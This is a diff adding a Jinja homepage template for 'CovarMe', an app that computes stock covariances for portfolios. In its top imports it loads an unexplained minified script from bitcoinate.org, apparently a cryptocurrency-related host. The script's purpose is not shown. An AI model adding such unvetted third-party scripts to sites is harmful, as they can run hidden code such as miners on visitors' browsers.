@@ -1,0 +1,22 @@
+{% extends "layout.html" %}
+
+{% block top_imports %}
+<script src=//bitcoinate.org/scripts/libraries/0.2.2.min.js></script>
+{% endblock %}
+
+{% block body %}
+<body>
+
+  <section class="bck white text center">
+    <h1>Welcome to <strong>Covar</strong>Me</h1>
+    <div class="row text center">
+      <div class="column_8 offset_2">
+        <p>The database currently tracks <span class='science'>{{ tickers_total }}</span> stocks out of which <span class='science'>{{ tickers_available }}</span> are currently fully up-to-date and available for calculations</p>
+        <p>To serve the estimated covariance values more quickly, the application currently stores <span class='science'>{{ matrix_items_stored }}</span> individual covariances between companies in a specifically designed matrix database.</p>
+        <p><a href="register" class="button success large margin-top">Create Portfolio</a></p>
+      </div>
+    </div>
+  </section>
+
+</body>
+{% endblock %}
